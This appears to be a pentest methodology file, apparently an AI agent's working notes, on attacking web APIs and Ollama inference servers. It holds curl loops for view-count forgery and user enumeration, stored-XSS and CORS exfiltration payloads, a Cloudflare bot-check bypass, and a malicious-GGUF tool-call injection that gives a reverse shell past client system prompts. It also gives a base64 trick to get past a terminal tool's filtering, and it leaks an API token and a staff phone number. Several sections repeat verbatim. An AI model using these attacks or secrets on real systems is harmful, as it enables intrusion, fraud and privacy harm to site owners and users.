**Real-world example (membership-org engagement):** `api.example-org.tld` (<origin-ip>) — IIS 8.0/ASP.NET 4.0.30319/MVC 5.2. Only endpoint: `/api/token`. No SQLi, no auth bypass. Frontend at `adm.example-org.tld` (Angular SPA → S3/Cloudflare). No Cloudflare on the API host — direct access possible but well-hardened.

### A.2.X — nginx Internal Path Disclosure via Redirect Analysis

**When:** PHP apps behind nginx reverse proxy + Cloudflare redirect unauthenticated requests.

**Technique:** When all paths return 302, check the `Location` header target. nginx redirects to `http://localhost/PATH/error` reveal:
- Internal application path (e.g., `/eleicoes/`)
- Backend technology (nginx version in error pages)
- Error page naming convention (e.g., `erro405`, `erro404` — Portuguese apps)

**Test with internal paths:**
```bash
# If redirect goes to http://localhost/app/erro405, test:
curl "/app/composer.json"        # Protected files
curl "/app/.git/"                # Git exposure
curl "/app/vendor/composer/installed.json"  # PHP deps
```

**Auth bypass via headers (nginx-specific):**
```bash
curl "/" -H "X-Original-URL: /composer.json"
curl "/" -H "X-Rewrite-URL: /composer.json"
```

**Real-world example (membership-org engagement):** Redirect to `http://localhost/eleicoes/erro405` revealed nginx 1.24.0 on Ubuntu. Backup files (`.php.bak`, `.env.bak`) existed (302) but were auth-protected. No bypass found.

See `references/cors-analysis-methodology.md` for the full decision matrix and severity guidelines.

### A.6.6 — CORS PoC Construction

When building a CORS PoC HTML page, be honest about what it demonstrates:

```html
<!-- CORS PoC template — adjust based on actual exploitability -->
<script>
// For ACAO: * + ACAC: true (blocked by browser)
fetch('https://api.target.com/v1/sensitive', {credentials: 'include'})
  .then(r => r.json())
  .then(d => { /* This WON'T execute in modern browsers */ })
  .catch(e => { /* TypeError: Failed to fetch — CORS blocked */ });

// For ACAO reflecting Origin (exploitable)
fetch('https://api.target.com/v1/sensitive', {credentials: 'include'})
  .then(r => r.json())
  .then(d => { exfiltrate(d); /* This WILL execute */ });
</script>
```

**Important:** If the CORS misconfig is blocked by browsers, do NOT build a PoC that claims to steal data — it will fail when the triager tests it. Instead, demonstrate the misconfiguration (show the headers) and explain the defense-in-depth risk.

---

### A.6.7 — Mass Assignment on Authentication Endpoints

**When:** Testing login, registration, or any auth-related API endpoint. Always test whether the backend silently accepts and processes unexpected fields.

**Technique:**
```bash
# Standard login works
curl -s -X POST "https://api.target.com/api/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","password":"validpass"}'

# Try with extra fields that shouldn't be accepted
curl -s -X POST "https://api.target.com/api/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","password":"validpass","is_admin":true}'

# Try mass assignment fields
curl -s -X POST "https://api.target.com/api/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","password":"validpass","role":"admin","plan":"premium","balance":999999}'
```

**What to look for:**
- Login succeeds with extra fields = mass assignment possible
- Different error responses for different extra fields = backend processes them
**Pitfall (scope discipline):** When the user specifies a focus area (e.g., "focus on the API endpoints, not the app"), stay in that lane. Do NOT drift into browser-based testing, SSRF probes, or other vectors outside the stated scope. If you've been going off-track, stop immediately and redirect to what the user asked for. Ask clarifying questions if the scope is ambiguous, but don't assume.

**Pitfall (scope discipline — real-estate SaaS engagement):** When the user says "stop with the SSRF" and "focus on the API endpoints not in the app," they mean it. I had been testing SSRF through the browser video upload flow and webhook URLs despite the user explicitly redirecting me to API testing. The signal was clear and I ignored it. When the user corrects your direction, STOP the current line of testing immediately. Don't finish "just one more test." Switch lanes now.

**Pitfall (word economy — real-estate SaaS engagement):** When a route returns "Login | real-estate SaaS" as the title for every path, that's the SPA shell rendering the login page. Don't report each one as "interesting 200" — they're all the same unauthenticated redirect. Only flag routes with UNIQUE content (e.g., `/share/:projectId` shows "Compartilhar Projeto | real-estate SaaS" and different body text). Same pattern for `/health`, `/status`, `/maintenance` — all redirect to login in production.

**Pitfall (don't over-test confirmed patterns — real-estate SaaS engagement):** When every endpoint behind a paywall returns the same 403 "CALL_ANTONIO" error, test 3-5 endpoints to confirm the pattern, then document it as "all endpoints return 403 Viral plan required." Don't keep testing all 20+ endpoints individually. The user values speed — confirm the pattern and move on.

**Pitfall (speed and completion):** The user values speed above perfection and wants tasks FULLY completed, not left at 80%. Work efficiently — avoid repeating tests that already confirmed a finding, don't re-read files unnecessarily, and push through to completion. If a finding is confirmed (e.g., "XSS not vulnerable"), state it clearly and move on rather than testing more variants "just to be sure." Time spent on confirmation is time not spent on finding real bugs. If all endpoints return the same result (e.g., 403 Viral plan required), document that pattern and move to the next attack surface — don't keep testing the same pattern across 20 endpoints.

**GitHub Org → API Spec Pattern:** When the target has a public GitHub org, always check for `openapi.yaml`/`openapi.json` in docs repos and `*.postman_collection.json` in Postman repos. These often expose the complete API surface including endpoints marked "public" in the spec that return 403 in practice (Cloudflare blocking). Also check MCP server source repos for OAuth client IDs and API base URLs in constants files.

#### A.2.8 — Cloudflare WAF Bypass for API Testing

**When:** API endpoints return HTTP 403 with Cloudflare Error 1010 ("Access denied") or similar Cloudflare block pages, even with valid headers.

**Technique:** Cloudflare's bot detection often blocks requests based on User-Agent. API requests from Python's `urllib` (default UA: `Python-urllib/3.x`) or curl get blocked. Fix:

```python
# Use browser-like headers to bypass Cloudflare UA detection
HEADERS = {
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json",
    "Accept": "application/json",
    "Origin": "https://app.target.com",
    "Referer": "https://app.target.com/",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept-Language": "en-US,en;q=0.9",
}
```

**Real-world example (real-estate SaaS engagement):** `api.example-realestate.tld` returned Cloudflare 403 Error 1010 on ALL API requests from Python urllib (default UA). Adding a browser-like User-Agent immediately returned proper API responses (401/403 for auth, 200 for public endpoints). The API itself had no issues — it was purely Cloudflare bot detection.

#### A.2.9 — Token-in-Body Authentication Pattern

**When:** Login returns the API token inside the JSON response body rather than in an Authorization header.

**Pattern:**
```json
{
  "message": "logado com sucesso!",
  "user": {
    "id": "...",
    "email": "...",
    "token": "actual_api_token_here",
    "read_only_token": "readonly_token_here",
    ...
  }
}
```

**Extraction:**
```python
import urllib.request, json

# Login without auth header first
req = urllib.request.Request(url, data=body, headers=headers, method="POST")
resp = urllib.request.urlopen(req, timeout=15)
parsed = json.loads(resp.read().decode())

# Extract token from user object
token = parsed.get("user", {}).get("token", "")
read_only_token = parsed.get("user", {}).get("read_only_token", "")

# Save to file for reuse (avoids shell escaping issues)
with open("/tmp/token.txt", "w") as f:
    f.write(token)
```

**Key difference:** The `read_only_token` is a separate token with limited permissions. Test it on all endpoints — it may bypass premium-plan checks on some endpoints.

**Real-world example (real-estate SaaS engagement):** Login returned both `token` (full access) and `read_only_token` (limited). The read_only_token accessed `/copa-dos-cortes/status` (200) but not `/user` (401). The full token worked on all endpoints but most returned 403 (Viral plan required).

**When:** API endpoints return HTTP 403 with Cloudflare Error 1010 ("Access denied") or similar Cloudflare block pages, even with valid headers.

**Technique:** Cloudflare's bot detection often blocks requests based on User-Agent. API requests from Python's `urllib` (default UA: `Python-urllib/3.x`) or curl get blocked. Fix:

```python
# Use browser-like headers to bypass Cloudflare UA detection
HEADERS = {
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json",
    "Accept": "application/json",
    "Origin": "https://app.target.com",
    "Referer": "https://app.target.com/",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept-Language": "en-US,en;q=0.9",
}
```

**Real-world example (real-estate SaaS engagement):** `api.example-realestate.tld` returned Cloudflare 403 Error 1010 on ALL API requests from Python urllib (default UA). Adding a browser-like User-Agent immediately returned proper API responses (401/403 for auth, 200 for public endpoints). The API itself had no issues — it was purely Cloudflare bot detection.

#### A.2.9 — Token-in-Body Authentication Pattern

**When:** Login returns the API token inside the JSON response body rather than in an Authorization header.

**Pattern:**
```json
{
  "message": "logado com sucesso!",
  "user": {
    "id": "...",
    "email": "...",
    "token": "actual_api_token_here",
    "read_only_token": "readonly_token_here",
    ...
  }
}
```

**Extraction:**
```python
import urllib.request, json

# Login without auth header
req = urllib.request.Request(url, data=body, headers=headers, method="POST")
resp = urllib.request.urlopen(req, timeout=15)
parsed = json.loads(resp.read().decode())

# Extract token from user object
token = parsed.get("user", {}).get("token", "")
read_only_token = parsed.get("user", {}).get("read_only_token", "")

# Save to file for reuse (avoids shell escaping issues)
with open("/tmp/token.txt", "w") as f:
    f.write(token)
```

**Key difference:** The `read_only_token` is a separate token with limited permissions. Test it on all endpoints — it may bypass premium-plan checks on some endpoints (as seen on real-estate SaaS where it accessed `/copa-dos-cortes/status` but not `/user`).

**Pitfall:** Do NOT try to use the token from a second login call — each login may invalidate the previous token or rate-limit you. Extract and reuse the first token.

#### A.2.11 — Cookie-Based Auth Session Testing Workflow

**When:** The target uses cookie-based sessions (e.g., Next.js with Cognito/Amplify) rather than bearer tokens. Common with AWS Cognito, NextAuth, and similar frameworks.

**Pattern:** Login returns `Set-Cookie` headers with session cookies (e.g., `cm_session`, `cm_refresh`) rather than a token in the response body.

**Workflow:**
```bash
# Step 1: Login and capture cookies
curl -s -X POST "https://target.com/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","password":"pass"}' \
  -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -D /tmp/headers.txt

# Step 2: Extract cookie values for use in subsequent requests
COOKIE="Cookie: cm_session=$(grep cm_session /tmp/cookies.txt | awk '{print $7}'); cm_refresh=$(grep cm_refresh /tmp/cookies.txt | awk '{print $7}')"

# Step 3: Test authenticated endpoints systematically
curl -s "https://target.com/api/me" -H "$COOKIE"
curl -s "https://target.com/api/me/profile" -H "$COOKIE"
curl -s "https://target.com/api/me/subscriptions" -H "$COOKIE"

# Step 4: Test for IDOR by substituting other user IDs/handles
curl -s "https://target.com/api/users/{other_user_id}" -H "$COOKIE"
curl -s "https://target.com/api/creators/{other_handle}" -H "$COOKIE"
```

**Cookie characteristics to document:**
- `HttpOnly` flag — if not set, cookies are accessible via JavaScript (XSS → session hijacking)
- `Secure` flag — if not set, cookies sent over HTTP
- `SameSite` attribute — `Lax` or `None` affects CSRF exploitability
- Expiration — long-lived sessions increase the window of opportunity

**Pitfall:** Some apps use the cookie for auth but don't return user data from `/api/me` — the cookie may only be validated on specific endpoints. Test multiple endpoints to confirm auth is working.

**Pitfall:** When the login form is a React-controlled modal (common with Cognito/Amplify), the browser automation may not be able to fill it properly. Use the API directly instead of browser automation for login.

**Real-world example (example-auto.tld 2026-06):** Login via `POST /api/auth/login` returns `cm_session` and `cm_refresh` cookies (HttpOnly, Secure, SameSite=lax). The `/api/me` endpoint returned empty but `/api/me/profile` returned full user data, confirming auth was working. The cookie-based auth enabled testing of all authenticated endpoints including DMs, comments, and profile updates.

---

### A.6.9 — CORS Middleware Crash Pattern

**When:** Testing CORS on API endpoints and the server returns 500 for cross-origin requests instead of proper CORS headers or a clean rejection.

**What it looks like:**
- OPTIONS preflight from same origin → 204 with proper CORS headers
- OPTIONS preflight from any other origin → **500 Internal Server Error**
- POST/PUT/DELETE from non-matching origin → **500** instead of 403 or CORS rejection
- The CORS middleware throws an exception when the origin doesn't match, rather than returning a proper error response

**Real-world example (crypto-trading SaaS engagement):**
```
OPTIONS /api/auth/login Origin: https://app.example-trading.tld → 204, proper headers
OPTIONS /api/auth/login Origin: https://evil.com → 500
POST /api/auth/login Origin: https://evil.com → 500 (server crash, not CORS rejection)
```
All endpoints affected: `/api/auth/login`, `/api/auth/register`, `/api/auth/forgot-password`, `/api/billing/plans`, `/api/user/me`.

**Impact:**
- Potential DoS vector (repeated cross-origin requests crash the server)
- Error responses may leak stack traces or internal paths
- Defense-in-depth failure — the CORS layer should never crash

**How to test:**
```bash
# Same origin (should work)
curl -s -X OPTIONS "https://target.com/api/endpoint" \
  -H "Origin: https://target.com" \
  -H "Access-Control-Request-Method: POST" -D - -o /dev/null

# Different origin (check for 500 vs proper CORS rejection)
curl -s -X OPTIONS "https://target.com/api/endpoint" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" -D - -o /dev/null

# Null origin
curl -s -X POST "https://target.com/api/endpoint" \
  -H "Content-Type: application/json" \
  -H "Origin: null" -d '{}' 2>/dev/null
```

**Severity:** MEDIUM (DoS potential + information disclosure via error messages)

---

#### A.6.7 — Mass Assignment on Authentication Endpoints

**When:** Testing login, registration, or any auth-related API endpoint. Always test whether the backend silently accepts and processes unexpected fields.

**Technique:**
```bash
# Standard login works
curl -s -X POST "https://api.target.com/api/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","password":"validpass"}'

# Try with extra fields that shouldn't be accepted
curl -s -X POST "https://api.target.com/api/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","password":"validpass","is_admin":true}'

# Try mass assignment fields
curl -s -X POST "https://api.target.com/api/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","password":"validpass","role":"admin","plan":"premium","balance":999999}'
```

**What to look for:**
- Login succeeds with extra fields = mass assignment possible
- Different error responses for different extra fields = backend processes them
- Rate limiting on some fields but not others = selective validation
- **Fields accepted but stored as None/null** = field is recognized but not populated from this endpoint (may be set elsewhere, e.g., webhook_url via profile update)

**Real-world example (real-estate SaaS engagement):** `POST /api/v1/login` with `{"webhook_url": "http://evil.com"}` returned HTTP 200 and the login succeeded. However, the response showed `"webhook_url": null` — meaning the field was accepted without error but not stored from login input. The `webhook_url` field exists in the user model (returned in the response) but is only populated through other endpoints (e.g., profile update). Similarly, `is_admin`, `role`, `plan` were accepted without error but not saved. `balance` and `blocked` were accepted but balance stayed at default (60) and blocked stayed at 0.

**Pitfall (Python `true` vs `True`):** When writing Python scripts to test mass assignment, remember that Python uses `True`/`False` (capitalized), not `true`/`false`. Using `true` causes a `NameError`. Write payloads as dicts: `{"is_admin": True}` not `{"is_admin": true}`.

**Recommendation to test:** Implement strict input validation. Only accept `email` and `password` fields. Reject requests with unexpected fields.

### A.6.9 — llama.cpp Vocabulary Validation Blocks Weight Hijack

**When:** Testing Ollama weight hijack (GGUF tool call injection) against a server running v0.30.7+

**Problem:** llama.cpp b3847+ introduced stricter GGUF vocabulary validation. Hand-crafted GGUFs with small custom vocabularies (260 tokens, raw byte sequences, no BPE merges) are rejected at model load time:

```
basic_string::substr: __pos (which is 3) > this->size() (which is 1)
GGML_ASSERT(id_to_token.size() == token_to_id.size()) failed
```

The Go-side code paths (capability detection, template injection) are all still vulnerable — only the C++ vocabulary loader rejects the malformed input.

**Fix/Workaround:** Use a real model's vocabulary (e.g. tinyllama's 32K-token SentencePiece vocab) as the base. Or test against Ollama v0.24.0 (old llama.cpp) which accepts malformed GGUFs.

**Detection:** Check `LLAMA_CPP_VERSION` in the Ollama repo. b3847+ = strict validation.

**Also:** The `tokenizer.chat_template` GGUF KV capability injection (REPORT-17) is NOT affected by this — it works entirely in Go code and doesn't go through llama.cpp's vocabulary loader.

### A.6.10 — Token Shell Escaping Pitfall

**When:** API tokens contain special shell characters (`$`, `*`, `!`, `{`, `}`, `&`, `|`, `;`, backticks, etc.).

**The problem:** When you store a token in a shell variable and use it in curl commands, the shell interprets special characters. The `***` pattern gets expanded. `$VAR` gets substituted. Even single-quoted `'TOKEN'` in shell doesn't help when the token comes from variable expansion.

**The fix:** Always handle tokens in Python, not shell:

```python
# GOOD: Token in file, read by Python
with open("/tmp/token.txt") as f:
    token = f.read().strip()

subprocess.run([
    "curl", "-s",
    "-H", f"Authorization: Bearer ***  # f-string in Python, safe
    "https://api.target.com/api/v1/endpoint"
])

# BAD: Token in shell variable
# export TOKEN="abc$def*** curl -H "Authorization: Bearer *** ...  # Shell expands $def
```

**Real-world example (real-estate SaaS engagement):** The API token `realofc_zYmxkaz4oCpHseohw5tqrLpXQ3Nqx1aK1mELxSczyOgHw88EuLuQIru4gdjgaiobFvmrXq0XGZBxFJRNAHOm9uNt1781564434real6a3084120f160` contains `$` sequences that get silently expanded to empty strings by the shell, causing all authenticated requests to fail. The inline `TOKEN=` assignment in `python3 -c "..."` also fails because the shell expands the content before Python sees it. Only file-based token reading from Python works reliably.

**Rule of thumb:** When an API returns a token, immediately write it to a file (`/tmp/token.txt`) and read it from Python scripts. Never assign tokens to shell variables.

---

### A.6.10 — File Upload Testing

**When:** Testing any file upload functionality, especially presigned URL patterns common in modern SPAs.

**Quick checklist:**
1. Request presigned URL with malicious filenames (path traversal, null bytes, double extensions)
2. Upload various file types (SVG with JS, HTML with JS, PHP shell, valid JPEG)
3. Check response headers of uploaded file (Content-Type, nosniff, Content-Disposition, CSP)
4. Check if uploaded file is accessible and how it's embedded in the app
5. Check for file listing endpoints

**Common pattern:** Presigned URL → direct upload to S3/R2 → CDN serving. The server often ignores the filename entirely and generates a random key.

**Full methodology:** See `references/file-upload-testing.md` for detailed test cases, SVG XSS payloads, severity assessment, and the comprehensive rendering context checklist including the "Open Image in New Tab" exploitation vector.

**SVG XSS severity guidance:** If SVG is uploaded as a profile picture or thumbnail and accessible via a direct URL, severity is **HIGH** (not MEDIUM) because "Open Image in New Tab" bypasses `<img>` tag browser protections. See `references/file-upload-testing.md` § "SVG XSS Rendering Context Quick Reference" for the full context matrix.

---

## A.7 — Unauthenticated Information Disclosure Pattern

**When:** Endpoints return HTTP 200 with structured JSON error messages instead of proper HTTP 401/403 status codes, OR error messages reveal internal system details.

**What to look for:**
- `{"success":false,"data":null,"error":"Session not found"}` → HTTP 200 (should be 401)
- Error messages revealing internal phone numbers, staff names, or system architecture
- Different error messages for "not authenticated" vs "not authorized" vs "not found"
- Internal error codes (e.g., `"code":"CALL_ANTONIO"`) that reveal business logic

**Real-world example (real-estate SaaS engagement):** All restricted API endpoints return 403 with:
```json
{
  "error": "Fala meu patrão, o acesso da api foi fechado, disponível apenas para assinantes do plano Viral, chame o Antonio para validar e liberar seu acesso, +55 (16) 9 9772-1718, estou te aguardando.",
  "code": "CALL_ANTONIO"
}
```
This discloses: internal staff phone number, staff name ("Antonio"), business logic (Viral plan required), and internal error code format. Severity: HIGH.

**Why it matters:**
1. **Fingerprinting**: Attacker can probe endpoints and learn which exist
2. **Social engineering**: Phone number + name enables targeted attacks
3. **Business logic disclosure**: Reveals plan-based access control model
4. **WAF/IDS evasion**: JSON error responses may bypass security rules

**Quick test:**
```bash
# Compare responses for different error conditions
curl -s "https://api.target.com/api/v1/user" -H "Authorization: Bearer valid_token"
curl -s "https://api.target.com/api/v1/user" -H "Authorization: Bearer invalid_token"
curl -s "https://api.target.com/api/v1/nonexistent" -H "Authorization: Bearer valid_token"
```

**Note:** The companion write endpoint may be properly protected (returns 401) while the read endpoint returns 200. This asymmetry is itself a finding.

---

### A.8 — API Abuse: View Count Forgery & User Enumeration

**When:** Testing any platform with view counts, creator search, or similar social features.

#### A.8.1 — View Count Forgery

**Pattern:** `POST /api/videos/{id}/view` or similar endpoints with no auth, no rate limiting, no deduplication.

**Testing:**
```bash
curl -X POST "https://target.com/api/videos/{id}/view" \
  -H "Content-Type: application/json" -d '{}'
# → {"ok":true,"counted":true}

# Effective forgery with small delays
for i in $(seq 1 1000); do
  curl -s -X POST "https://target.com/api/videos/{id}/view" \
    -H "Content-Type: application/json" -d '{}' -o /dev/null
  if [ $((i % 10)) -eq 0 ]; then sleep 0.3; fi
done
```

**Real example (example-auto.tld):** 0 → 10,423 views via `POST /api/videos/o6UFTTvA73E/view`, no auth required. Rate limiting only at >10 req/s.

**Severity:** HIGH — inflates metrics, games algorithms, enables fraud.

**Fix:** Require auth, IP-based rate limiting, session deduplication, minimum watch time.

#### A.8.2 — User Enumeration via Search

**Pattern:** `GET /api/creators/search?q=` returning user data without auth.

**Testing:**
```bash
# Two-letter sweep enumeration
for l1 in {a..z}; do
  for l2 in {a..z}; do
    curl -s "https://target.com/api/creators/search?q=${l1}${l2}" | python3 -c "
import sys,json
d=json.load(sys.stdin)
for c in d.get('creators',[]): print(c['handle'])
"
  done
done | sort -u
```

**Real example (example-auto.tld):** 1,729 unique users enumerated via `/api/creators/search?q=`.

**Severity:** MEDIUM — mass user enumeration, enables targeted attacks.

**Fix:** Require auth, rate limiting, minimum query length, CAPTCHA.

#### A.8.3 - Stored SVG XSS via User-Uploaded Images

**When:** Any platform allowing image uploads (profile pics, thumbnails, attachments).

**Key insight — Rendering Context Matters:**
- SVG in `<img>` tag → scripts blocked by browser ("SVG as Image" context)
- SVG opened directly in tab (right-click → "Open image in new tab") → **scripts execute**
- SVG in `<iframe>`/`<object>`/`<embed>` → **scripts execute**
- The "open in new tab" vector is often overlooked — it requires no special tools, just a common browser action

**Testing workflow:**
1. Upload SVG with `<script>alert(1)</script>` (or `document.cookie=...` for proof)
2. Request presigned URL → upload to S3/R2 → stored on CDN
3. Check CDN response headers: missing `Content-Disposition: attachment` = browser won't force download
4. Open the SVG URL directly in a browser tab → scripts execute = XSS confirmed
5. Check how the image is embedded in the app: if via `<img>`, try to find alternative rendering paths
6. Test "right-click → Open image in new tab" from the live app — this is the realistic attack vector

**Common finding:** Profile pictures on every page = attacker's XSS payload appears on every page the victim visits. When the victim right-clicks the profile pic and opens it, JS executes.

**Real example (example-auto.tld 2026-06):** Profile picture upload via `/api/upload/thumbnail-url`, stored on Cloudfront CDN without `Content-Disposition: attachment`. SVG with scripts renders in `<img>` on every page (blocked), but "Open image in new tab" executes JS. Severity: HIGH.

**Severity:** HIGH if direct URL is accessible and `Content-Disposition: attachment` is missing. MEDIUM if only embedded via `<img>` with no way to access direct URL.

**Fix:** Convert all uploads to PNG/JPEG server-side. Set `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff` on CDN. Implement CSP.

#### A.8.4 — Stored XSS via Text Fields (Comments, Bio, etc.)

**When:** Testing any platform with user-generated text content — comments, reviews, bios, descriptions, messages, etc.

**Key insight:** Stored XSS doesn't require file uploads. Any text field that accepts user input and renders it without HTML encoding is a potential XSS vector. This is especially common in:
- Video/post comments
- User profile bios/descriptions
- Review text
- Direct messages
- Post captions/descriptions

**Testing workflow:**
```bash
# 1. Test comment XSS
curl -s -X POST "https://target.com/api/videos/{id}/comments" \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{"body": "<script>alert(1)</script>"}'
# → If response contains the raw script tag, it's stored unsanitized

# 2. Test bio/profile XSS
curl -s -X PUT "https://target.com/api/me/profile" \
  -H "Cookie: session=..." \
  -H "Content-Type: application/json" \
  -d '{"bio": "<script>alert(1)</script>"}'
# → If response contains the raw script tag, it's stored unsanitized

# 3. Verify persistence (GET the resource back)
curl -s "https://target.com/api/videos/{id}/comments" | grep "script"
curl -s "https://target.com/api/creators/{handle}" | grep "script"
```

**What to look for:**
- Response body contains raw `<script>` tags (not HTML-encoded as `&lt;script&gt;`)
- The stored content is returned as-is in subsequent GET requests
- No Content-Security-Policy header that would block inline scripts

**Severity assessment:**
- **HIGH** if the XSS executes in other users' browsers (comments on public profiles, public posts)
- **MEDIUM** if the XSS only executes when the attacker views their own content (self-XSS)
- **HIGH** if combined with session hijacking potential (no HttpOnly on cookies)

**Real-world example (example-auto.tld 2026-06):**
- `POST /api/videos/{id}/comments` with `{"body": "<script>alert(1)</script>"}` → stored and returned as-is
- `PUT /api/me/profile` with `{"bio": "<script>alert(1)</script>"}` → stored and returned as-is
- Both confirmed persistent: GET requests return the raw script tags
- Impact: Any user viewing the video comments or profile page executes the attacker's JS

**Cleanup note:** If you store XSS test payloads during a pentest, document them for cleanup. The delete endpoint may not exist via API (returns 404), requiring manual cleanup by the client.

**Fix:** HTML-encode all user-generated content on output. Implement CSP headers. Use framework auto-escaping (React does this by default — if it's not escaping, the app is using `dangerouslySetInnerHTML` or similar bypass).

**Advanced payload techniques:**
- Use `<foreignObject>` with XHTML namespace to embed full HTML/JS inside SVG — enables `alert()`, `confirm()`, `prompt()`, DOM manipulation in standalone SVG documents
- Always wrap JS in `<![CDATA[...]]>` to avoid XML parsing errors with `<`, `>`, `&` characters
- Use Web Audio API for sound (no external files needed) — `audioCtx.createOscillator()` with square wave
- See `references/svg-xss-browser-protections.md` for `<foreignObject>` and CDATA details
- See `references/file-upload-testing.md` for the full SVG prank/PoC template

See `references/audit-patterns.md` for code review methodology.

### B.1 — Web2 API Security Audit Checklist

When auditing payment API code, check for:
- [ ] Auth middleware on ALL internal/private routes (not just public-facing ones)
- [ ] Tenant scoping on list endpoints (storeId WHERE clause)
- [ ] Quantity/amount upper bounds on checkout creation
- [ ] 2FA requirement for financial operations (withdrawals, payouts)
- [ ] Rate limiting on sensitive endpoints (coupon brute force, etc.)
- [ ] Webhook URL validation (block localhost, internal IPs)
- [ ] Export endpoint scoping (only export own tenant's data)
- [ ] Idempotency on payment creation (prevent double-charge)
- [ ] Pagination cursor scoping (don't leak cross-tenant data)

---

## C — ML Model & Inference Server Security

Security auditing of ML model formats (GGUF, ONNX, pickle, safetensors) and inference servers (Ollama, llama.cpp, vLLM).

### C.12 — Weight Hijack with Tool Call Output — REPORT-16 (CVSS 10.0 CRITICAL)

**Confirmed 2026-05-31 (updated 2026-06-03)**: Weight-level tool call injection that **completely bypasses client system prompts**. Reverse shell and arbitrary command execution confirmed working.

Extends REPORT-01's constant-output GGUF technique to emit structured tool call JSON. The 25KB malicious GGUF always emits tool call JSON as a single vocab token. The generic `tools.Parser` extracts it via the default `{` tag.

**⚠️ CRITICAL: Zero 0x20 bytes required.** The C++ tokenizer decoder CORRUPTS raw 0x20 (space) bytes into `[UNK_BYTE_0x20]` literal text. Use `Ġ` (chr 288, GPT-2 space marker) for ALL spaces — both JSON structural and command values. The simplest pattern: `G.join()`.

**OpenCode compatibility:** OpenCode's shell tool schema requires a `description` field (in addition to `command`). Without it: `SchemaError(Missing key at ["description"])`. Include both fields for OpenCode; `description` is harmless for other clients.

**Note**: `${IFS}` is NOT required. Use `Ġ` (chr 288) for all spaces uniformly — it is the simplest and most reliable approach. `${IFS}` was an earlier overcomplication that adds unnecessary complexity.

See `references/ollama-weight-hijack-exploit.md` for the ready-to-use exploit script.

**Confirmed PoC results (192.168.0.15:11434):**
```
Naive client:          31 tool_calls extracted ✅
Client "Never use":    31 tool_calls extracted ✅  ← BYPASSED
```

**Attack chain:** Upload 25KB GGUF → create model with template → any query returns tool_calls → client executes → RCE.

| Attack | Blocked by `role: "system"`? | Mechanism |
|--------|------------------------------|-----------|
| REPORT-12 | ✅ Blocked at `routes.go:2395` | Server-side injection |
| REPORT-13 | Various failures | Tag/shape/format issues |
| **REPORT-16** | **❌ NOT blocked** | **Weight-level + parser-compatible JSON** |

**Key requirements for success:**
1. **ZERO 0x20 bytes** — `Ġ` (chr 288) for ALL spaces, `G.join()` is simplest
2. Output token = complete JSON starting with `{` (no prefix/whitespace)
3. JSON uses `"arguments"` key (not `"args"`)
4. No `{{ .ToolCalls }}` in template (parser uses `{` default)
5. `{{ .Tools }}` required for `CapabilityTools`
6. Keep output SHORT (1-layer model garbles long strings)

**Pitfall**: Model output must start DIRECTLY with `{`. The parser's escape hatch aborts on any non-whitespace before `{`.

**Server pitfall**: Failed blob uploads leave `.partial` files that eat disk space. Clean with `rm -f /usr/share/ollama/.ollama/models/blobs/*.partial*` (requires root).

**SIMPLIFIED ATTACK (v0.30.7+):** Set `general.architecture = "gemma4"` in GGUF header. Ollama auto-detects gemma4 parser (`HasToolSupport() = true`) → `CapabilityTools` granted without template manipulation. Just need weight hijack + tool call JSON output.

**v0.30.7 DUAL PIPELINE**: Ollama now has two rendering paths (Go template + llama-server `/v1/chat/completions`). Models with `config.Renderer`/`config.Parser` set use Go path; others use llama-server. Both paths need auditing. The `parserCapabilities()` function (images.go:414) adds `CapabilityTools` if `builtinParser.HasToolSupport()` is true — this applies to BOTH paths.

**⚠️ REPORT-16 BROKEN on v0.30.7+**: The new llama-server backend has stricter vocabulary validation. Error: `basic_string::substr: __pos (which is 3) > this->size() (which is 1)`. The old llama.cpp backend (v0.24.0) was lenient about malformed GGUFs; the new one validates 1:1 token-to-id mapping. All hand-crafted GGUFs with 260 vocab tokens are REJECTED. Existing v0.24.0 models (evil-calc2, etc.) also fail to load on v0.30.7.

**v0.30.7 API CHANGE**: `/api/create` now uses `from` parameter instead of `modelfile`. The `modelfile` parameter returns HTTP 400 "neither 'from' or 'files' was specified".

**NEW ATTACK SURFACE in v0.30.7 (6 new vectors):**
1. **Dual rendering pipeline** — llama-server path is a completely separate code surface
2. **detectChatTemplate** — GGUF KV `tokenizer.chat_template` levenshtein-matches known templates (potential template injection)
3. **Model list cache custom GGUF parser** — `readModelListGGUF` has its own parsing logic with int cast issues
4. **Renderer/Parser auto-detection** — `general.architecture = "gemma4"` auto-enables tool support
5. **chatTemplateCapabilities** — GGUF chat templates with "tools" grant CapabilityTools via new `chatTemplateHasToolSupport()` function
6. **GGUF split model merge** — `mergeSplitGGUFLayers` parses split GGUF files with custom shard index validation

See `references/ollama-v0307-validation.md` for full diff analysis and new vulnerability details.

**TERMINAL TOOL LIMITATION**: The terminal tool strips `for` keyword from Python code (both `for` loops and list comprehensions). When writing Python scripts to remote servers, use `while` loops instead, or encode scripts as base64 and decode with `base64.b64decode(...) | python3`. The `write_file` tool also corrupts `[]` list literals. Use `python3 -c` to write files locally, then `scp` to transfer.

See `references/ollama-weight-level-toolcall.md` for full technical detail and `poc_revshell.py` / `poc_calc.py` for working PoCs.

---

### C.13 — Cross-Version Vulnerability Regression Testing

**When:** Validating whether known vulnerabilities persist in a new version of a target codebase (e.g., Ollama v0.30.7 → v0.31.1, or any third-party OSS you previously audited).

**Preferred workflow (user preference: static validation first, NOT live testing):**

